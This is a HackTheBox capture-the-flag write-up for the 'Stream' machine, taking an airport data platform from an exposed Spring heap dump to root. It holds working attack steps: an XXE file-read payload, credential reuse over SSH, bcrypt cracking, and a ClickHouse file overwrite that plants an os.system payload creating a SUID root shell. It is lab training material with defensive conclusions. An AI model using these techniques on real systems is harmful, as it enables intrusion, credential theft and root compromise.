# Stream - HackTheBox Writeup

## Introduction

**Stream** is a Medium Linux machine set in the airport-themed Season 12. The visible surface is a small airport data platform: an nginx front end, a Spring Boot **terminal-edge-gateway** on `api.htb-airport.htb`, a Uvicorn **AIDX flight-leg ingest** on port 8081, and a ClickHouse database published as `db.htb-airport.htb`.

The chain is a data-pipeline compromise rather than a classic web bug. The Spring actuator exposes an unauthenticated heap dump; the dump contains the `DataSourceConfig` class with the ClickHouse service account. ClickHouse holds the `partner_feed` Kafka-backed AIDX pipeline. The ingest accepts raw AIDX XML, and the downstream parser uses lxml with `load_dtd=True, resolve_entities=True, no_network=False`. That turns the XML entity into arbitrary file read as `svc-infra`. The Kafka systemd unit points to the broker config, whose SASL JAAS password is reused for SSH as `svc-infra`. The SASL-only identity topic contains `martin_cole`'s bcrypt hash, which cracks to `tinkerbell` and gives the user flag. A Kopia backup of ClickHouse logs leaks the `default` ClickHouse password in a failed `ALTER USER` error. The `default` user has the `FILE` grant, and a root systemd timer executes a ClickHouse `user_files` formatter on every DLQ message. Overwriting that formatter and publishing a malformed message yields root.

The writeup follows that chain in order and keeps the exact commands and evidence.

-----

## 1. Initial Enumeration

A full TCP scan exposes four ports:

```bash
nmap -Pn -n -p- --min-rate 5000 -T4 -oN scans/nmap_full.txt 10.129.136.14
nmap -Pn -n -sVC -p22,80,8081,42079 -oN scans/nmap_services.txt 10.129.136.14
```

```text
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.19
80/tcp    open  http       nginx 1.24.0 (Ubuntu)
8081/tcp  open  http       Uvicorn
42079/tcp open  tcpwrapped
```

The nginx root redirects to `api.htb-airport.htb`. The vhost returns a gateway status document:

```bash
curl -s -H 'Host: api.htb-airport.htb' http://10.129.136.14/
```

```json
{"service":"terminal-edge-gateway","status":"operational","version":"1.0.0",
 "node":"tg-edge-01","region":"eu-central-1",
 "upstreams":{"flight-data-service":"UP","boarding-control":"UP",
              "gate-assignment":"UP","passenger-manifest":"UP"},
 "message":"All terminal gateway systems are operational.", ...}
```

The 404 body is the Spring Boot error envelope, and `/actuator` advertises a heap dump:

```bash
curl -s -H 'Host: api.htb-airport.htb' http://10.129.136.14/actuator
```

```json
{"_links":{"self":{"href":"http://api.htb-airport.htb/actuator"},
           "heapdump":{"href":"http://api.htb-airport.htb/actuator/heapdump"}}}
```

Port 8081 is a FastAPI/Uvicorn service. Its OpenAPI document exposes only three routes:

```bash
curl -s http://10.129.136.14:8081/openapi.json
```

```text
GET  /
GET  /health
POST /feeds/aidx
```

`/health` names the Kafka topic used by the pipeline:

```json
{"status":"ok","service":"AIDX flight-leg ingest","raw_topic":"aidx.flightleg.raw.v1"}
```

The database vhost is `db.htb-airport.htb`. It must be mapped to the target (or supplied with `--resolve` / `Host:`):

```bash
echo '10.129.136.14 db.htb-airport.htb' | sudo tee -a /etc/hosts
```

A request to the ClickHouse vhost returns the ClickHouse summary headers:

```bash
curl -si http://db.htb-airport.htb/
```

```text
HTTP/1.1 200 OK
X-ClickHouse-Summary: {"read_rows":"0", ...}
X-ClickHouse-Exception-Tag: ...
```

Port 42079 accepts TCP but closes every protocol probe (H2, Kafka, PostgreSQL, HTTP/2, TLS); it is not needed for the chain.

-----

## 2. Heap Dump → ClickHouse Service Credentials

The actuator heap dump is unauthenticated:

```bash
curl -s -H 'Host: api.htb-airport.htb' \
  http://10.129.136.14/actuator/heapdump -o loot/heapdump.hprof
```

The dump is a Java HPROF file. The application classes are present in the heap, including their class-file constant pools. Carving the `CAFEBABE` class files and running `javap` on `com.htb.terminal.config.DataSourceConfig` reveals hardcoded credentials:

```bash
javap -p -c -constants loot/classes/com_htb_terminal_config_DataSourceConfig.class
```

```text
private static final java.lang.String DB_JDBC_URL =
  "jdbc:h2:mem:terminaldb;MODE=PostgreSQL;DB_CLOSE_DELAY=-1";
private static final java.lang.String DB_USERNAME = "svc_events";
private static final java.lang.String DB_PASSWORD = "Yl4aCgh4y2PnU";
```

| Credential | Value |
|---|---|
| ClickHouse user | `svc_events` |
| ClickHouse password | `Yl4aCgh4y2PnU` |

The `DataSourceConfig` class also builds a Hikari pool named `terminal-edge-pool`; the H2 URL is an in-process database, so the useful pair is the username/password, which is reused by the `svc_events` ClickHouse account.

-----

## 3. ClickHouse and the AIDX Pipeline

Authenticate to the ClickHouse HTTP interface on `db.htb-airport.htb`:

```bash
curl -s -H 'Host: db.htb-airport.htb' \
  -u 'svc_events:Yl4aCgh4y2PnU' \
  --data-binary 'SHOW DATABASES' http://db.htb-airport.htb/
```

```text
partner_feed
```

The user has `SELECT, INSERT ON partner_feed.*`:

```text
GRANT SELECT, INSERT ON partner_feed.* TO svc_events
```

The schema describes the whole event pipeline:

```sql
SHOW CREATE TABLE partner_feed.flightleg_raw_kafka;
SHOW CREATE TABLE partner_feed.flightleg_raw;
SHOW CREATE TABLE partner_feed.flightleg_raw_mv;
SHOW CREATE TABLE partner_feed.flightleg_json_kafka;
SHOW CREATE TABLE partner_feed.flightleg_json;
SHOW CREATE TABLE partner_feed.flightleg_json_mv;
```

| Table | Engine | Role |
|---|---|---|
| `flightleg_raw_kafka` | Kafka | consumes `aidx.flightleg.raw.v1` with `RawBLOB` |
| `flightleg_raw` | MergeTree | stores the raw XML (`raw`, `source`, `event_ts`) |
| `flightleg_raw_mv` | MaterializedView | copies Kafka rows into `flightleg_raw` |
| `flightleg_json_kafka` | Kafka | consumes `aidx.flightleg.json.v1` with `JSONAsString` |
| `flightleg_json` | MergeTree | stores parsed JSON fields and the full event |
| `flightleg_json_mv` | MaterializedView | extracts JSON fields from the Kafka rows |

The Kafka engine tables point at `localhost:9092`:

```text
kafka_broker_list = 'localhost:9092'
kafka_topic_list = 'aidx.flightleg.raw.v1'
kafka_format = 'RawBLOB'
```

The pipeline is therefore:

```text
POST /feeds/aidx (raw XML)
  -> aidx.flightleg.raw.v1
  -> parser worker
  -> aidx.flightleg.json.v1
  -> partner_feed.flightleg_json
```

-----

## 4. XXE in the AIDX Ingest → File Read as `svc-infra`

The ingest endpoint accepts a raw XML body:

```bash
curl -s -X POST -H 'Content-Type: application/xml' \
  --data-binary @payload.xml \
  http://10.129.136.14:8081/feeds/aidx
```

A valid AIDX message returns:

```json
{"accepted":true,"topic":"aidx.flightleg.raw.v1"}
```

The endpoint only checks for the presence of the strings `IATA_AIDX_FlightLegNotifRQ`, `Originator`, `FlightLeg`, and `LegIdentifier`; it explicitly says the body is validated downstream. The parser worker reads the raw topic and uses `/opt/aidx-pipeline/app/aidx_common.py`, whose parser is:

```python
def _plain_parser() -> etree.XMLParser:
    return etree.XMLParser(load_dtd=True, resolve_entities=True, no_network=False)
```

`to_full_canonical()` and `_el_to_dict()` preserve every element and attribute under `all_fields`, so any expanded entity is written into the JSON topic and then into `partner_feed.flightleg_json`.

The smallest reliable payload uses the real AIDX namespace and places the entity in `RemarkFreeText`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE IATA_AIDX_FlightLegNotifRQ [
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<ns0:IATA_AIDX_FlightLegNotifRQ
    xmlns:ns0="http://www.iata.org/IATA/2007/00"
    Version="22.1"
    TimeStamp="2026-10-28T13:30:00Z"
    TransactionIdentifier="tx-xxe-file"
    TransactionStatusCode="Update">
  <ns0:Originator CompanyShortName="BAW" TravelSector="A" Code="BA" CodeContext="3"/>
  <ns0:DeliveringSystem CompanyShortName="BAW" Name="OPS-CTL" CodeContext="3"/>
  <ns0:FlightLeg>
    <ns0:LegIdentifier>
      <ns0:Airline CodeContext="3">BA</ns0:Airline>
      <ns0:FlightNumber>999</ns0:FlightNumber>
      <ns0:DepartureAirport CodeContext="3">LHR</ns0:DepartureAirport>
      <ns0:ArrivalAirport CodeContext="3">JFK</ns0:ArrivalAirport>
      <ns0:OriginDate>2026-10-28</ns0:OriginDate>
      <ns0:RepeatNumber CurrentInd="true">1</ns0:RepeatNumber>
    </ns0:LegIdentifier>
    <ns0:LegData InternationalStatus="International">
      <ns0:RemarkFreeText>&file;</ns0:RemarkFreeText>
      <ns0:FlightStatus CodeContext="9948">DP</ns0:FlightStatus>
    </ns0:LegData>
  </ns0:FlightLeg>
</ns0:IATA_AIDX_FlightLegNotifRQ>
```

After the pipeline processes the message, the file content is in ClickHouse:

```sql
SELECT JSONExtractString(event,'leg','all_fields','LegData','RemarkFreeText')
FROM partner_feed.flightleg_json
WHERE transaction_id='tx-xxe-file'
FORMAT TSVRaw
```

```text
root:x:0:0:root:/root:/bin/bash
...
svc-infra:x:1000:1000:,,,:/home/svc-infra:/bin/bash
clickhouse:x:996:987::/nonexistent:/bin/false
martin_cole:x:1001:1001:,,,:/home/martin_cole:/bin/bash
```

The parser runs as `svc-infra`. The XXE is therefore arbitrary file read in the context of the pipeline service account.

> **Practical note:** small regular files are reflected reliably. Large files can exceed the entity resolver's limit and produce an empty field or a DLQ entry; `/etc/passwd`, `/etc/hostname`, `/etc/hosts`, and `/etc/systemd/system/kafka.service` read cleanly.

-----

## 5. Kafka Unit → SASL JAAS → SSH as `svc-infra`

Reading the Kafka unit through the same LFI returns:

```ini
[Unit]
Description=Apache Kafka Distributed Message Broker
After=network.target

[Service]
Type=simple
User=svc-infra
Group=svc-infra
SupplementaryGroups=kafka-data
WorkingDirectory=/opt/kafka_2.13-4.3.1
ExecStart=/opt/kafka_2.13-4.3.1/bin/kafka-server-start.sh /opt/kafka_2.13-4.3.1/config/server.properties
ExecStop=/opt/kafka_2.13-4.3.1/bin/kafka-server-stop.sh
Restart=on-failure
RestartSec=10s

[Install]
WantedBy=multi-user.target
```

The config path is `/opt/kafka_2.13-4.3.1/config/server.properties`. Its security section is:

```properties
listeners=PLAINTEXT://127.0.0.1:9092,SASL_PLAINTEXT://127.0.0.1:9094,CONTROLLER://127.0.0.1:9093
sasl.enabled.mechanisms=PLAIN
listener.name.sasl_plaintext.plain.sasl.jaas.config=org.apache.kafka.common.security.plain.PlainLoginModule required \
  user_svc_infra="Ny2hdpme$bwT3";
authorizer.class.name=org.apache.kafka.metadata.authorizer.StandardAuthorizer
allow.everyone.if.no.acl.found=true
```

The SASL user is `svc_infra`; the systemd service runs the broker as the OS account **`svc-infra`**. The password is reused:

```bash
ssh svc-infra@10.129.136.14
# password: Ny2hdpme$bwT3
```

```text
uid=1000(svc-infra) gid=1000(svc-infra) groups=1000(svc-infra),100(users)
```

-----

## 6. Kafka Identity Topic → `martin_cole` → user.txt

The broker exposes a SASL-only listener on `127.0.0.1:9094`. As `svc-infra`, build a client configuration:

```properties
security.protocol=SASL_PLAINTEXT
sasl.mechanism=PLAIN
sasl.jaas.config=org.apache.kafka.common.security.plain.PlainLoginModule required username="svc_infra" password="Ny2hdpme$bwT3";
```

List the topics:

```bash
/opt/kafka_2.13-4.3.1/bin/kafka-topics.sh \
  --bootstrap-server localhost:9094 \
  --command-config /tmp/kafka-client.properties --list
```

```text
__consumer_offsets
aidx.flightleg.dlq.v1
aidx.flightleg.json.v1
aidx.flightleg.raw.v1
aidx.identity.json.v1
```

The identity topic contains the user records:

```bash
/opt/kafka_2.13-4.3.1/bin/kafka-console-consumer.sh \
  --bootstrap-server localhost:9094 \
  --consumer.config /tmp/kafka-client.properties \
  --topic aidx.identity.json.v1 \
  --from-beginning --max-messages 20
```

```json
{"user_id":"u-10041","username":"deborah.hernandez",
 "email":"deborah.hernandez@autopilot.htb","password":"8F5cgp@tC8g@",
 "algo":"plaintext","status":"active","roles":["ops"], ...}
{"user_id":"u-10058","username":"martin_cole",
 "email":"m.okonkwo@aidx.internal",
 "password":"$2b$12$/RNAvZeJj2E16wOLNg9wYOQSY8rpS1Pg3Zy57z9fhB371E0SrYD2y",
 "algo":"bcrypt","cost":12,"status":"active",
 "roles":["ops.app","flightleg"], ...}
```

The `martin_cole` record uses bcrypt cost 12. The hash cracks to:

```text
tinkerbell
```

Verify it locally:

```python
import bcrypt
h = b'$2b$12$/RNAvZeJj2E16wOLNg9wYOQSY8rpS1Pg3Zy57z9fhB371E0SrYD2y'
assert bcrypt.checkpw(b'tinkerbell', h)
```

SSH as `martin_cole` and read the user flag:

```bash
ssh martin_cole@10.129.136.14     # tinkerbell
cat /home/martin_cole/user.txt
```

```text
1c83bf6f<REDACTED>
```

-----

## 7. Kopia Backup → ClickHouse `default` Password

`martin_cole` owns a Kopia repository:

```bash
kopia repository status
```

```text
Config file:         /home/martin_cole/.config/kopia/repository.config
Description:         Repository in Filesystem: /home/martin_cole/backups
Hostname:            stream
Username:            martin_cole
```

```bash
kopia snapshot list
```

```text
martin_cole@stream:/home/martin_cole/ch-logs
  2026-08-25 10:21:17 UTC kc43a7ec76aeac204b305df2b777304d1 1.4 MB drwxr-xr-x files:2 dirs:1
```

Restore the snapshot:

```bash
kopia snapshot restore kc43a7ec76aeac204b305df2b777304d1 /tmp/ch-logs-restore
```

```text
Restored 2 files, 1 directories and 0 symbolic links (1.4 MB).
```

The restored files are:

```text
/tmp/ch-logs-restore/clickhouse-server.err.log   9565 bytes
/tmp/ch-logs-restore/clickhouse-server.log    1376075 bytes
```

The error log contains a failed administrative query; the query text includes the password:

```bash
grep -n 'ALTER USER default' /tmp/ch-logs-restore/clickhouse-server.err.log
```

```text
2026.08.25 10:13:42.753114 [ 1759 ] {9ae1c88a-847e-4425-be98-ec6166c77bb2} <Error> DynamicQueryHandler:
Code: 62. DB::Exception: Double quoted string is not closed: Syntax error: failed at position 1
("ALTER USER default IDENTIFIED BY 'N3v3rs33nD4T4 ;):
"ALTER USER default IDENTIFIED BY 'N3v3rs33nD4T4 ;. . (SYNTAX_ERROR)
```

The original path inside the snapshot is `/home/martin_cole/ch-logs/clickhouse-server.err.log`; the restored copy is `/tmp/ch-logs-restore/clickhouse-server.err.log`.

The failed query leaks the ClickHouse `default` password: `N3v3rs33nD4T4`.

Verify it and inspect the grants:

```bash
curl -s -u 'default:N3v3rs33nD4T4' -H 'Host: db.htb-airport.htb' \
  --data-binary 'SELECT currentUser(), version()' http://db.htb-airport.htb/
```

```text
default 26.8.1.1746
```

```bash
curl -s -u 'default:N3v3rs33nD4T4' -H 'Host: db.htb-airport.htb' \
  --data-binary 'SHOW GRANTS' http://db.htb-airport.htb/
```

The `default` user has global `SELECT`, `INSERT`, `CREATE`, `ALTER`, `FILE`, `URL`, `KAFKA`, `CREATE USER`, and related privileges. That is a much larger surface than the `svc_events` account.

-----

## 8. Root — Overwrite the DLQ Drainer Formatter

### 8.1 The root timer

The host runs a root-owned DLQ drainer every two minutes:

```bash
systemctl list-timers --all | grep aidx
```

```text
aidx-dlq-drainer.timer -> aidx-dlq-drainer.service
```

```ini
# /etc/systemd/system/aidx-dlq-drainer.service
[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /opt/ops/dlq_drainer.py
```

```ini
# /etc/systemd/system/aidx-dlq-drainer.timer
[Timer]
OnBootSec=1min
OnUnitActiveSec=2min
AccuracySec=15s
```

`/opt/ops/dlq_drainer.py` subscribes to `aidx.flightleg.dlq.v1` and, for each message, runs the formatter:

```python
FORMATTER = os.environ.get("AIDX_FORMATTER",
                           "/var/lib/clickhouse/user_files/aidx_quarantine.py")

p = subprocess.run(["python3", FORMATTER], input=raw,
                   capture_output=True, check=False)
```

Because the service runs as **root**, the formatter is executed as root. The formatter lives in ClickHouse's `user_files` directory, and the `default` ClickHouse user has the `FILE` grant.

### 8.2 Overwriting the formatter

The first attempt used `INSERT INTO FUNCTION file(...,'RawBLOB')`; ClickHouse **appended** the payload to the existing formatter without a newline, producing a Python syntax error. The clean method is the `File` engine, which can replace the file after a `TRUNCATE`:

```sql
DROP TABLE IF EXISTS partner_feed.qfmt;
CREATE TABLE partner_feed.qfmt (s String)
  ENGINE=File(RawBLOB, '/var/lib/clickhouse/user_files/aidx_quarantine.py');
TRUNCATE TABLE partner_feed.qfmt;
INSERT INTO partner_feed.qfmt VALUES (
'import os; os.system("cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; cat /root/root.txt > /tmp/root.txt; chmod 644 /tmp/root.txt")'
);
```

Verify the result is the exact one-line script:

```bash
curl -s -u 'default:N3v3rs33nD4T4' -H 'Host: db.htb-airport.htb' \
  --data-binary "SELECT * FROM file('/var/lib/clickhouse/user_files/aidx_quarantine.py','RawBLOB') FORMAT RawBLOB" \
  http://db.htb-airport.htb/
```

```text
import os; os.system("cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; cat /root/root.txt > /tmp/root.txt; chmod 644 /tmp/root.txt")
```

### 8.3 Trigger the drainer

Publish any message to the DLQ through the local PLAINTEXT listener. The malformed AIDX is sufficient; the drainer does not validate the content, it only feeds it to the formatter:

```bash
printf '%s\n' '<!-- x --><foo/>' | \
  /opt/kafka_2.13-4.3.1/bin/kafka-console-producer.sh \
  --bootstrap-server localhost:9092 \
  --topic aidx.flightleg.dlq.v1
```

At the next timer tick, the root drainer executes the formatter. The payload copies `/root/root.txt` to `/tmp/root.txt` and creates a SUID Bash at `/tmp/rootbash`:

```bash
ls -la /tmp/rootbash /tmp/root.txt
```

```text
-rwsr-xr-x 1 root root 1446024 ... /tmp/rootbash
-rw-r--r-- 1 root root      33 ... /tmp/root.txt
```

```bash
/tmp/rootbash -p -c 'id; cat /root/root.txt'
```

```text
uid=1000(svc-infra) gid=1000(svc-infra) euid=0(root) groups=1000(svc-infra),100(users)
6ac0e90c<REDACTED>
```

The root flag is captured.

-----

## Conclusions

- **The actuator heap dump is a credential store.** Spring Boot Actuator's `heapdump` endpoint exposed the loaded `DataSourceConfig` class, including the ClickHouse username and password. Actuator endpoints should be disabled or authenticated on any externally reachable service.
- **The XML parser trusted external entities.** The AIDX parser enabled `load_dtd=True`, `resolve_entities=True`, and `no_network=False`, so a valid-looking flight-leg message turned into arbitrary file read as `svc-infra`. Safe XML parsing must disable external DTDs and entities.
- **Password reuse crossed the service boundary.** The Kafka SASL JAAS password for `svc_infra` was also the SSH password for `svc-infra`. A service account password should be unique to its service and rotated independently.
- **Secrets survived in backups.** `martin_cole`'s Kopia repository contained a ClickHouse error log with a failed `ALTER USER` query that included the new `default` password. Backups inherit the sensitivity of everything they contain; logs must not include credentials, even in error paths.
- **A privileged timer consumed user-writable input.** The root-run `aidx-dlq-drainer` executed a formatter from ClickHouse's `user_files` directory, which the `default` ClickHouse user could overwrite with its `FILE` grant. The combination of a broad database privilege and a root timer turned a data-pipeline cleanup job into root code execution.
- **Attack chain:** heap dump → `svc_events` ClickHouse credentials → `partner_feed` pipeline → AIDX XXE / LFI as `svc-infra` → Kafka unit / `server.properties` SASL JAAS → SSH as `svc-infra` → `aidx.identity.json.v1` → `martin_cole` bcrypt → `tinkerbell` → user flag → Kopia `ch-logs` snapshot → failed `ALTER USER` log leak → ClickHouse `default:N3v3rs33nD4T4` → `FILE` grant → overwrite `aidx_quarantine.py` → DLQ message → root timer → SUID Bash → root flag.

## References

- [Spring Boot Actuator — heapdump endpoint](https://docs.spring.io/spring-boot/reference/actuator/endpoints.html)
- [lxml — XMLParser options (`resolve_entities`, `load_dtd`, `no_network`)](https://lxml.de/parsing.html)
- [ClickHouse — HTTP interface](https://clickhouse.com/docs/interfaces/http)
- [ClickHouse — Kafka table engine](https://clickhouse.com/docs/engines/table-engines/integrations/kafka)
- [ClickHouse — File table engine and `user_files`](https://clickhouse.com/docs/engines/table-engines/special/file)
- [Apache Kafka — SASL/PLAIN configuration](https://kafka.apache.org/documentation/#security_sasl_plain)
- [Kopia — snapshot restore](https://kopia.io/docs/reference/command-line/common/snapshot-restore/)
- [systemd.timer](https://www.freedesktop.org/software/systemd/man/latest/systemd.timer.html)
